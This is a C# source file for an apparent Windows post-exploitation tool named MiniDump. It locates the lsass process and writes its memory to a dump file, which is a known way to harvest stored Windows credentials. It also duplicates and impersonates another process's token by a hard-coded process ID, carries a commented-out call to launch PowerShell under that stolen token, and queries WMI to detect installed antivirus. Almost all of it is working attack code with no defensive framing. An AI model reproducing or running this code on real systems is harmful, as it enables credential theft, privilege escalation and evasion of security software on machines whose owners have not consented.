using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Management;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;
using System.Linq;

namespace MiniDump
{

    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, int bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint GetLastError();


        [DllImport("dbghelp.dll",
                    EntryPoint = "MiniDumpWriteDump",
                    CallingConvention = CallingConvention.Winapi,
                    CharSet = CharSet.Unicode,
                    ExactSpelling = true,
                    SetLastError = true)]
        private static extern bool MiniDumpWriteDump(IntPtr hProcess,
                    uint processId,
                    SafeHandle hFile,
                    MINIDUMP_TYPE dumpType,
                    ref MINIDUMP_EXCEPTION_INFORMATION  expParam,
                    IntPtr userStreamParam,
                    IntPtr callbackParam);

        [DllImport("kernel32.dll", SetLastError = true)]

        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]

        static extern uint GetCurrentProcessId();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint GetCurrentThreadId();



        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }

        internal delegate Boolean Create(IntPtr phNewToken, String newProcess, String arguments);

        public static void GetWin32Error(String location)
        {
            Console.WriteLine(" [-] Function {0} failed: ", location);
            Console.WriteLine(" [-] {0}", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
        }

        protected void FindExe(ref String command, out String arguments)
        {
            arguments = "";
            if (command.Contains(" "))
            {
                String[] commandAndArguments = command.Split(new String[] { " " }, StringSplitOptions.RemoveEmptyEntries);
                command = commandAndArguments.First();
                arguments = String.Join(" ", commandAndArguments.Skip(1).Take(commandAndArguments.Length - 1).ToArray());
            }
        }


        protected IntPtr hExistingToken;
        protected IntPtr phNewToken;

        ////////////////////////////////////////////////////////////////////////////////
        // Sets hToken to a processes primary token
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetPrimaryToken(UInt32 processId, String name)
        {
            //Originally Set to true
            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_INFORMATION, true, processId);
            if (hProcess == IntPtr.Zero)
            {
                return false;
            }
            Console.WriteLine("[+] Recieved Handle for: {0} ({1})", Process.GetProcessById((int)processId).ProcessName, processId);
            Console.WriteLine(" [+] Process Handle: 0x{0}", hProcess.ToString("X4"));

            if (!kernel32.OpenProcessToken(hProcess, Constants.TOKEN_ALT, out hExistingToken))
            {
                return false;
            }
            Console.WriteLine(" [+] Primary Token Handle: 0x{0}", hExistingToken.ToString("X4"));
            kernel32.CloseHandle(hProcess);
            return true;
        }
        ////////////////////////////////////////////////////////////////////////////////
        // Impersonates the token from a specified processId
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean ImpersonateUser(Int32 processId)
        {
            phNewToken = new IntPtr();
            hExistingToken = new IntPtr();

            Console.WriteLine("[*] Impersonating {0}", processId);
            GetPrimaryToken((UInt32)processId, "");
            if (hExistingToken == IntPtr.Zero)
            {
                return false;
            }
            Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
            if (!advapi32.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED,
                        ref securityAttributes,
                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Winnt._TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                GetWin32Error("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Duplicate Token Handle: 0x{0}", phNewToken.ToString("X4"));
            if (!advapi32.ImpersonateLoggedOnUser(phNewToken))
            {
                GetWin32Error("ImpersonateLoggedOnUser: ");
                return false;
            }
            Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Calls CreateProcessWithTokenW
        ////////////////////////////////////////////////////////////////////////////////

        public void Dispose()
        {
            if (IntPtr.Zero != phNewToken)
                kernel32.CloseHandle(phNewToken);
            if (IntPtr.Zero != hExistingToken)
                kernel32.CloseHandle(hExistingToken);
        }
       


        ////////////////////////////////////////////////////////////////////////////////
        // Calls CreateProcessWithTokenW
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean StartProcessAsUser(Int32 processId, String newProcess)
        {

            GetPrimaryToken((UInt32)processId, "");
            if (hExistingToken == IntPtr.Zero)
            {
                return false;
            }
            Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
            if (!advapi32.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED,
                        ref securityAttributes,
                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Winnt._TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                GetWin32Error("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Duplicate Token Handle: 0x{0}", phNewToken.ToString("X4"));

            Create createProcess;
            //If the function fails, the return value is zero. To get extended error information
            if (0 == Process.GetCurrentProcess().SessionId)
            {
                createProcess = CreateProcess.CreateProcessWithLogonW;
            }
            else
            {
                createProcess = CreateProcess.CreateProcessWithTokenW;
            }
            String arguments = String.Empty;
            FindExe(ref newProcess, out arguments);

            if (!createProcess(phNewToken, newProcess, arguments))
            {
                return false;
            }
            return true;
        }

        public struct MINIDUMP_EXCEPTION_INFORMATION

        {
            public uint ThreadId;
            public IntPtr ExceptionPointers;
            public int ClientPointers;
        }

        public enum MINIDUMP_TYPE
        {
            MiniDumpNormal,
            MiniDumpWithDataSegs,
            MiniDumpWithFullMemory,
            MiniDumpWithHandleData,
            MiniDumpFilterMemory,
            MiniDumpScanMemory,
            MiniDumpWithUnloadedModules,
            MiniDumpWithIndirectlyReferencedMemory,
            MiniDumpFilterModulePaths,
            MiniDumpWithProcessThreadData,
            MiniDumpWithPrivateReadWriteMemory,
            MiniDumpWithoutOptionalData,
            MiniDumpWithFullMemoryInfo,
            MiniDumpWithThreadInfo,
            MiniDumpWithCodeSegs,
            MiniDumpWithoutAuxiliaryState,
            MiniDumpWithFullAuxiliaryState,
            MiniDumpWithPrivateWriteCopyMemory,
            MiniDumpIgnoreInaccessibleMemory,
            MiniDumpWithTokenInformation,
            MiniDumpWithModuleHeaders,
            MiniDumpFilterTriage,
            MiniDumpWithAvxXStateContext,
            MiniDumpWithIptTrace,
            MiniDumpScanInaccessiblePartialPages,
            MiniDumpValidTypeFlags
        }

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static void Dump_Process()
        {
            MINIDUMP_TYPE DumpLevel = MINIDUMP_TYPE.MiniDumpIgnoreInaccessibleMemory;

            string assemblyPath = Assembly.GetEntryAssembly().Location;
            string dumpFileName = assemblyPath + "_" + DateTime.Now.ToString("dd.MM.yyyy.HH.mm.ss") + ".dmp";
            FileStream file = new FileStream(dumpFileName, FileMode.Create);

            MINIDUMP_EXCEPTION_INFORMATION info = new MINIDUMP_EXCEPTION_INFORMATION();
            info.ClientPointers = 0;
            info.ExceptionPointers = Marshal.GetExceptionPointers();
            info.ThreadId = GetCurrentThreadId();

            // Get the current process.
            Process targetProcess = null;
            Process[] proc_lsass = Process.GetProcessesByName("lsass");
            targetProcess = proc_lsass[0];

            //GetCurrentProcess()
            // A full memory dump is necessary in the case of a managed application, other wise no information
            // regarding the managed code will be available
            bool state = MiniDumpWriteDump(targetProcess.Handle, GetCurrentProcessId(), 
                file.SafeFileHandle, DumpLevel, ref info, IntPtr.Zero, IntPtr.Zero);
            // the first last error check is fine here:
            Console.WriteLine(Marshal.GetLastWin32Error());
            Console.WriteLine(GetLastError());

            file.Close();
            string exeName = Path.GetFileName(assemblyPath);
            Console.WriteLine(" state = ");
            Console.WriteLine(state.ToString());

            Console.WriteLine
            (String.Format("Creating Dump For Process: {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFileName));
        }

        static void OpenPowerShell(string path)
        {
            Process.Start(path);
        }

        public static bool AntivirusInstalled()
        {

            string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
                ManagementObjectCollection instances = searcher.Get();
                return instances.Count > 0;
            }

            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            return false;
        }

        static void Main(string[] args)
        {
            Program test1 = new Program();
            Console.WriteLine("Dumping Current Process");
            Dump_Process();
            Console.WriteLine("Process Dump Completed!");
            Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
            bool ret = test1.ImpersonateUser(836);
           // bool ret = test1.StartProcessAsUser(836, "powershell.exe");
            test1.Dispose();
            Console.WriteLine(ret.ToString());
            Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
            bool av = AntivirusInstalled();
            Console.WriteLine(av.ToString());
            Console.ReadKey();
        }
    }
}
